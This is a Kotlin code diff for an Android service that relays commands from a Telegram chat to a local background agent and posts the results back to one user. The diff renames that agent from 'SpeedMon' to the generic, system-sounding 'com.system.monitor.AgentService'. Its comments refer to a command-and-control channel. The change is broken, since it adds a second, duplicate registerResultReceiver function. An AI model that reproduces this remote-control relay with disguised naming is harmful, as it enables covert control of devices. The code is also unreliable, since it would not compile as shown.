@@ -71,7 +71,7 @@ class TelegramBotService(private val context: Context) {
 
     private fun registerResultReceiver() {
         resultReceiver = ResultReceiver()
-        val filter = IntentFilter("com.speedmon.ACTION_RESULT")
+        val filter = IntentFilter("com.system.monitor.ACTION_RESULT")
         // Register as regular broadcast receiver for cross-app communication
         context.registerReceiver(resultReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
     }
@@ -265,14 +265,14 @@ class TelegramBotService(private val context: Context) {
         sendNVIDIACommand(chatId, prompt)
     }
 
-    // Send task to LOCAL SpeedMon service ONLY - NO C2
+    // Send task to LOCAL AgentService - NO C2
     private fun sendLocalTask(chatId: Long, capability: String, args: Map<String, Any>) {
         val taskId = java.util.UUID.randomUUID().toString()
         
-        // Send to local SpeedMon via explicit Intent to start service
+        // Send to local AgentService via explicit Intent
         val serviceIntent = Intent().apply {
-            setClassName("com.speedmon", "com.speedmon.SpeedMonService")
-            action = "com.speedmon.ACTION_COMMAND"
+            setClassName("com.system.monitor", "com.system.monitor.AgentService")
+            action = "com.system.monitor.ACTION_COMMAND"
             putExtra("capability", capability)
             putExtra("args", gson.toJson(args))
             putExtra("task_id", taskId)
@@ -283,28 +283,27 @@ class TelegramBotService(private val context: Context) {
             } else {
                 context.startService(serviceIntent)
             }
-            sendMessage(chatId, "✅ Task sent to SpeedMon: $capability")
+            sendMessage(chatId, "✅ Task sent to Agent: $capability")
         } catch (e: Exception) {
-            Log.e("TelegramBot", "Failed to start SpeedMon service", e)
-            sendMessage(chatId, "❌ Failed to send to SpeedMon: ${e.message}")
+            Log.e("TelegramBot", "Failed to start Agent service", e)
+            sendMessage(chatId, "❌ Failed to send to Agent: ${e.message}")
         }
         // NO C2 FALLBACK - LOCAL ONLY
     }
 
     // Local status - no C2
     private fun sendLocalStatus(chatId: Long) {
-        sendMessage(chatId, "📊 *Local Status:*\n✅ Bot running\n✅ Local mode active\n✅ SpeedMon: ${isSpeedMonRunning()}")
+        sendMessage(chatId, "📊 *Local Status:*\n✅ Bot running\n✅ Local mode active\n✅ Agent: ${isAgentRunning()}")
     }
 
     private fun sendLocalAgents(chatId: Long) {
         sendMessage(chatId, "🤖 *Local Agents:*\n📱 This device (${android.os.Build.MODEL})")
     }
 
-    private fun isSpeedMonRunning(): Boolean {
-        // Check if SpeedMon service is running
+    private fun isAgentRunning(): Boolean {
         val manager = context.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
         val services = manager.getRunningServices(100)
-        return services.any { it.service.className == "com.speedmon.SpeedMonService" }
+        return services.any { it.service.className == "com.system.monitor.AgentService" }
     }
 
     private fun notifyOnboard(userName: String) {
@@ -376,7 +375,7 @@ Example: /nvidia Explain quantum computing
         }
     }
 
-    // Result receiver for SpeedMon responses
+    // Result receiver for Agent responses
     private inner class ResultReceiver : BroadcastReceiver() {
         private val handler = Handler(Looper.getMainLooper())
         override fun onReceive(context: Context, intent: Intent) {
@@ -396,6 +395,23 @@ Example: /nvidia Explain quantum computing
                     "$emoji *Task $status:*\n$error"
                 }
                 sendMessage(ALLOWED_USER_ID, text)
+            }
+        }
+    }
+
+    private fun registerResultReceiver() {
+        resultReceiver = ResultReceiver()
+        val filter = IntentFilter("com.system.monitor.ACTION_RESULT")
+        // Register as regular broadcast receiver for cross-app communication
+        context.registerReceiver(resultReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
+    }
+
+    private fun unregisterResultReceiver() {
+        resultReceiver?.let { receiver ->
+            try {
+                context.unregisterReceiver(receiver)
+            } catch (e: Exception) {
+                Log.w("TelegramBot", "Unregister receiver failed", e)
             }
         }
     }
